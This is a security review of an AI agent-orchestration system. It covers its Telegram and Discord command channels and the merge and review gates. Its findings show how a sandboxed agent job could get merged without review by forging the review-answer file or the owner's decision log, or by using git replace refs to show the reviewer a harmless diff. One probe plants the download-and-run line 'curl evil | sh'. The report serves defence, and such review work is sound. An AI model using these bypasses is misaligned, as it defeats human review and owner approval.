# AR0404 - Security review, part 3: channels, merge and delivery

Reviewed on 2026-10-27 at main `25def243` by job 2026-10-27-worker-d27fde45. A review of Arthur's own defences, not a fix: each weakness found is an entry of `findings.md` beside this file (F1 to F9). The probes named below were throwaway unit tests and shell scripts in temporary folders made by `temporaryFolder()` and `mktemp -d`, run once and removed; nothing ran against the VPS, a bot, a real secret or a client repository.

Verdicts: **holds** (the check is in code, and a test or a probe shows it), **gap** (a finding), **out of scope** (another ticket's area, named).

## Summary

| Area | Verdict | Findings |
| --- | --- | --- |
| 1. Telegram answers only the owner | holds | none |
| 1. Phone commands that stop, restart or steer | holds (owner only); merge and spending go through the coordinator | F4, F7 |
| 1. The Discord plan | gap, low | F8 |
| 2. `--unreviewed` | holds in code; the owner's decision is the coordinator's record | F4 |
| 2. A PASS or `no review` on the tip | gap, high | F1, F2, F9 |
| 2. What a branch may write | gap, medium | F3 |
| 2. CI verdict reading | holds for the tip; low gaps | F5, F6 |
| 2. Branch name tricks | holds | none |

Findings by severity: high 2 (F1, F2), medium 2 (F3, F4), low 5 (F5 to F9).

## AR0311's findings in these areas

Each is a ticket already, so none is filed again.

| AR0311 | Its ticket | Fixed on main? | Evidence |
| --- | --- | --- | --- |
| F5, a job runs Arthur's state-changing commands | AR0353, AR0354, AR0355 (merged) | **Yes.** Inside a job the CLI refuses every command not marked `inJob` (`packages/core/src/cli.ts:48-52`). It tells a job by its systemd scope `arthur-job-<id>.scope` in `/proc/self/cgroup`, which no process of the job can change (`packages/core/src/inside-job.ts:9-13`), and falls back to `ARTHUR_JOB` only for a job run without systemd. `merge`, `review`, `review-needed`, `spawn`, `stop`, `stopall`, `steer`, `continue`, `prune`, `decision` carry no `inJob` (`job-commands.ts:26-48`, `merge-command.ts:31-51`). A job that brings its own config and home is not refused (AR0443), but it then acts in that home, and its sandbox lets it write no main checkout (`job-sandbox.ts:67-74`). `--unreviewed` and `--budget 0` need an owner's decision id (`merge-command.ts:105-107`, `decision-use.ts:17-21`). What remains is whose word that decision is: F4. |
| F6, a PASS rests on a hand-written task and on files a job may write | AR0357 (task), AR0360 (checks), merged | **Partly.** A review task must equal what `reviewTask` builds now, for an ended worker, in its project (`packages/delivery/src/delivery.ts:112-132`). The job's `checks` file is documented as the job's own word (`packages/delivery/docs/commands/review-needed.md:37`). Not fixed: F6 also named the `review-needed` answer, and the sandbox AR0376 added grants a job write access to that very file. Filed as F1, because the reach is new: the sandbox grant (`job-sandbox.ts:72`) postdates AR0311. |
| F7, Telegram answers every member of the chat | AR0364 (merged) | **Yes.** `poll.ts:56` drops a message whose `chat.id` or `from.id` is not the configured id, or one with `sender_chat`; `telegram.ts:89` takes only a positive id (a private chat), and the option says so (`telegram-options.ts:17`). Test: `telegram.test.ts:74`. Mutation probe below. |
| F11, `review-needed` skips small changes to installs and scripts | AR0358, AR0432 (merged) | **Yes.** The default always-review list holds every `package.json`, lockfiles, `.npmrc`, `.nvmrc`, composer, uv, yarn, pnpm and bun files, `.githooks/**`, `.husky/**`, and the prompt files (`packages/delivery/src/delivery-options.ts:17`). It does not hold `spec/decisions.jsonl` or `spec/build.json`: F3. |
| F13, `--auto` takes CI of an older commit | AR0359 (merged) | **Yes.** A run below the tip leaves a wait, never a pass (`packages/delivery/src/auto-merge.ts:65-68`). |

## 1. Channels

### Telegram: only the owner's id is answered

Checked: every condition a message must meet before it reaches the coordinator or the command registry.

- `packages/telegram/src/poll.ts:37` polls only `message` updates (`allowed_updates: ["message"]`), so no `edited_message`, `channel_post`, `business_message` or `callback_query` is received.
- `poll.ts:56` drops a message when `chat.id` is not the bot's configured chat, when `from.id` is not that same id, when it has a `sender_chat` (an anonymous admin, or a channel's post), or when it is more than 10 minutes old. A dropped message gets no reply, no `getFile` call and no event.
- `telegram.ts:88-89`: the chat id must be a positive whole number, which is the owner's private chat. A group id (negative) refuses the load. So `chat.id === from.id` is the user check.
- Several bots: each bot polls with its own `chat` (`telegram.ts:37`, `poll.ts:26`), and a reply goes back through the bot the message came in by (`telegram.ts:49-54`).
- A forwarded message (`forward_origin`) is never a phone command (`poll.ts:80`). Its text reaches the coordinator after a mark `[forwarded from <name>]`, with the name stripped of control, separator and format characters and of `]` (`media-in.ts:36`, `:44`). Tests: `commands.test.ts:105`, `:125`.
- A command addressed to another bot (`/x@otherbot`) is dropped (`poll.ts:83`).

How:

```
$ node --test packages/telegram/test/telegram.test.ts packages/telegram/test/commands.test.ts
ℹ tests 31
ℹ pass 31
ℹ fail 0
```

Mutation probe: in `poll.ts:56`, the `from.id` and `sender_chat` conditions were removed, the tests run, and the file copied back:

```
✖ a message of another chat or another sender is ignored, unanswered; one older than 10 minutes is dropped, 10 minutes exactly is not
ℹ pass 20
ℹ fail 1
```

Verdict: **holds**. AR0311 F7 is fixed, and a test would catch it coming back.

### Commands from the phone

Checked: what a `/name` message can do without the model. `commands.ts:77-89` routes only commands that registered `phone`.

- Phone commands that change state: `/stopall` (`job-commands.ts:48`), `/steer <id> <text>` (`:27-33`), `/restart [fresh]` (`packages/session/src/restart.ts:79`, refused while a job runs), and `/silent` (`packages/orchestration/src/silent.ts:76`).
- Read-only phone commands: `/jobs`, `/board`, `/task`, `/plan`, `/findings`, `/machines`, `/health`, `/retro`, `/usage`, `/projects`, `/resources`.
- `merge`, `spawn`, `continue`, `review`, `decision` and `prune` have no `phone`, so `/merge AR1` gets "unknown command" (`packages/core/test/commands.test.ts:158-160`).
- Merging and spending from the phone therefore happen only as text to the coordinator, which runs `arthur merge` or `arthur spawn`. `--unreviewed` and `--budget 0` then need a decision id that the owner answered (`decision-use.ts:27-46`). The answer itself is recorded by the coordinator, from what it takes to be the owner's words: F4.
- Only the owner's own message can run a phone command: the channel check above comes first, and a forwarded message is never a command.

Verdict: **holds** for the channel. The owner's word that a merge or a spend rests on stops being checked once it is inside the coordinator: F4. The coordinator's role does not say what a forwarded text inside an owner's message is: F7.

### How a message from someone else is rejected

Covered by the Telegram checks above: by chat, then by sender, then by `sender_chat`, then by age. Nothing is fetched and nothing is answered. Only `[via <channel>]` marks the owner, and the inbox quotes each line of every message after `> ` (`packages/orchestration/src/hand-over.ts:12-15`), so a line inside a message cannot start an owner's paragraph (AR0349). The coordinator role says so (`coordinator.md:12-16`).

### The Discord plan

Checked: `spec/roadmap.md:843-845` (entry 89), `:853-855` (entry 90), and `arthur.config.example.ts:444-457`. The plan answers only `userIdEnv` on one `guildIdEnv`, ignores the bot itself, gets no direct messages (no DIRECT_MESSAGES intent), and asks `arthur doctor` to flag a third member or a server without 2FA.

Missing from the plan: Discord forwards a message as the forwarder's own (its `author` is the owner, the original's content in `message_snapshots`), and the plan never says how such a message is treated. Telegram needed AR0365 for this. The plan also never says whether an edit (`MESSAGE_UPDATE`, which the GUILD_MESSAGES intent delivers) runs again. Verdict: **gap**, low: F8. The Discord API details are from its documentation as recalled, not checked in this job: [INFERENCE].

## 2. Merge and delivery

### `--unreviewed`

Checked: `merge-command.ts:35-45` parses `--unreviewed` with `--decision <id>`. A tip with no PASS is refused without both (`:104-105`). `decision.owner` (`packages/orchestration/src/decision-use.ts:27-56`) accepts only an id that is:

- in the decision log, of kind `merge`,
- answered, and not by policy,
- of this job's ticket, or of this job when there is no ticket,
- not used by another merge (`used/<id>`, created with `wx`).

Tests: `packages/delivery/test/merge.test.ts:253-276`. `arthur decision` is refused inside a job (`decision-commands.ts:64-68`).

Verdict: **holds** as a check. Two ways around it remain:

- The log is `spec/decisions.jsonl` in the project's own checkout (`decision-log.ts:18`, `:34-36`), and a branch may write it. `review-needed` lets a small such branch in without a review (probe P2 below): F3.
- An answer's "owner's words" are free text the coordinator writes (`decision-log.ts:180-191`), and nothing ties them to a message the owner sent: F4.

### A PASS, or `no review`, on the tip

Checked: `passGap` (`merge-command.ts:166-179`) counts a PASS when the newest review with a verdict of that exact commit says PASS. Review records are keyed by branch, and their `commit` is the full sha `branchOf` resolved (`review-command.ts:98`), so `tip.startsWith(review.commit)` is equality. It also counts `review-needed`'s `no review` when the kept answer's `commit` equals the tip. A review's prepare checks out the commit with `--no-replace-objects`, no hooks and no fsmonitor (`delivery.ts:58`). The merge, `review-needed` and `--auto` read git the same way (`merge-command.ts:66`, `review-needed.ts:33`, `auto-merge.ts:17`). Test: `merge.test.ts:212`.

Found:

- **The `no review` answer is a file the job may write.** `review-needed` keeps it at `<home>/delivery/<job>/review-needed` (`review-needed.ts:37`, `:41-43`). The sandbox grants each job write access to `<home>/<plugin>/<job>` for every plugin that registered an extension (`job-sandbox.ts:72`), and delivery registers one (`delivery.ts:92`), so that folder is the job's. Probe P1: a worker with no review. `writable()` for its record lists `<home>/delivery/<job id>`. `arthur merge` refuses, `no PASS on …'s tip b13bd4f: no review of it has a verdict`. Then `{"answer":"no review: forged","commit":"<tip>"}` is written there, and `arthur merge <job>` with no flag answers `merged arthur/2026-01-01-worker-4d300297 into main: e33832a`, with `HEAD^2` the worker's tip. **Gap, high: F1.**
- **The reviewer reads the diff through replacements a job may write.** The review's task tells the reviewer to judge `git diff <base>..<commit>` (`review-command.ts:82`). The reviewer's agent runs plain git, with no `GIT_NO_REPLACE_OBJECTS` in its environment (`wrapper.ts:129`), and the sandbox grants every job the repository's `refs` folder (`job-sandbox.ts:70`), where `refs/replace/` lives. Probe P3: a branch whose tip adds `run.sh` holding `curl evil | sh`. A file `refs/replace/<tip>` names a commit of the same parent whose `run.sh` says `echo hello`. In the review worktree, `git diff base..tip` shows `+echo hello`, `git --no-replace-objects diff base..tip` shows `+curl evil | sh`, and `cat run.sh` shows `curl evil | sh`. The merge takes the real tip. **Gap, high: F2.**
- **A branch's own `.gitattributes` can hide a text file from the diff.** Probe P4: a branch adds `shop.ts` and `.gitattributes` with `*.ts -diff`. `git diff` prints `Binary files /dev/null and b/shop.ts differ`. `review-needed` answers `review` for it (`numstat` `-`, `review-needed.ts:66`), so the review does happen, but the reviewer sees no lines unless it reads the file. **Gap, low: F9.**

### What a branch may write

Checked: which paths a worker's branch may change, as the review, `review-needed`, `--auto` and the merge see them.

- `review-needed` answers `no review` for 30 lines or fewer with the job's checks passing, unless a path is on the always-review list (`review-needed.ts:54-85`, `delivery-options.ts:17`). That list does not hold `spec/decisions.jsonl` (the owner's decision log) or `spec/build.json` (the board).
- `--auto` holds only roles, the vision, CI, `package.json` and that list (`auto-merge.ts:32-41`).
- No `merge.check` answers for a worker (only onboarding, `packages/projects/src/onboarding.ts:33-36`).
- The strays check leaves `spec/` out by design (`merge-command.ts:100`, `docs/commands/merge.md:22`).

Probes P2 and P2b: a worker's branch adds an `ask` of kind `merge` for AC0001 and an `answer` with words `yes` to `spec/decisions.jsonl` (2 lines), with `check` and `test` recorded as passing on the clean tip. `arthur review-needed` answers `no review: 2 lines changed; the job's checks: check pass, test pass`. The same for a branch that adds a ticket to `spec/build.json` as `approved`. After the merge, the forged answer is the one `decision.owner` reads (`decision-use.ts:33-46`); [INFERENCE] from the code, not probed past the merge. **Gap, medium: F3.**

### CI verdict reading

Checked: `github.ci` matches runs by `head_sha` on the branch's first-parent line (`packages/github/src/github-git.ts:21-27`), from the newest 100 runs of the project's workflow (`github-api.ts:70`). `--auto` needs a completed `success` run on the tip itself (`auto-merge.ts:62-75`). A plain merge refuses a completed run on the branch's own commits that did not succeed (AR0362, `:63`, `:74`).

Found:

- `--no-ci` skips CI for a plain merge and for `--auto` "on the owner's word only" (`merge-command.ts:40`, `:108`, `docs/commands/merge.md:36`, `:67`). It is a bare flag with no decision id, unlike `--unreviewed`. **Gap, low: F5.**
- Runs are not filtered by event, branch or repository. The newest run of any event on the tip's sha counts: a `pull_request` run from a fork, a `workflow_dispatch`, a `schedule`. A workflow whose steps depend on `github.event_name` can pass with fewer steps on another event. Not probed against GitHub: [INFERENCE] from the API's documented `event`, `head_branch` and `head_repository` fields, which the plugin does not read (`github-api.ts:92`). **Gap, low: F6.**

### Branch name tricks

Checked: every name and record field a merge reads.

- The record folder is writable by its own job (`job-sandbox.ts:74`, `record`), so a job may rewrite its own `branch`, `task`, `kind` or `project` while it runs. It cannot do so after its end: its scope ends with it (`job-scope.ts`), and no other job's record is in its writable paths.
- The review's task is built from that same record after the worker ended, so a rewritten branch or ticket changes what is reviewed, not what passes.
- `passGap` and `--auto` need a PASS whose full sha equals the tip the merge then merges by sha (`merge-command.ts:68`, `:113`).
- A branch name that names `main` or another worker's branch adds nothing, or brings that branch's own review (`review-command.ts:100-101`, `merge-command.ts:88-89`).
- A tag or another ref under the branch's name changes what `rev-parse` resolves, but the PASS must then be on that sha (`merge-command.ts:68`, `:104`).
- Pushes name `refs/heads/<branch>` (`github-git.ts:68`, `:75`).
- Moving `refs/heads/main` from a job (the refs folder is writable) leaves main's index and working tree as they were, so `git status` shows the change and the merge refuses `main has uncommitted changes` (`merge-command.ts:84-86`), except for `spec/build.json` and `CHANGELOG.md` (DERIVED), which the next commit after a merge overwrites. [INFERENCE] from git's status rules; not probed.

Verdict: **holds**.

### After the merge

Checked: steps on main run in the step sandbox, with the checkout's Git config and hooks not writable (`job-sandbox.ts:110-142`, AR0449, AR0457). A failed step resets main with `--keep` after the config is checked again (`merge-command.ts:131-137`). The push is refused when the config names a program (`github-git.ts:65-66`). Verdict: **holds**, and the area belongs to AR0402 and AR0405.

## Commands run

- `node --test packages/telegram/test/telegram.test.ts packages/telegram/test/commands.test.ts`: 31 pass, 0 fail; then the mutation of `poll.ts:56` (1 fail, shown above) and the file copied back.
- Probes P1, P2 and P2b: a throwaway `packages/delivery/test/zz-probe.test.ts` on `fakeHost` and `fakeAgent` in `temporaryFolder()`. `node --test packages/delivery/test/zz-probe.test.ts`: the lines quoted above, `ℹ pass 3`. Removed after.
- Probes P3 and P4: throwaway `sh` scripts on a `mktemp -d` repository, removed with it. Output quoted above. Removed after.
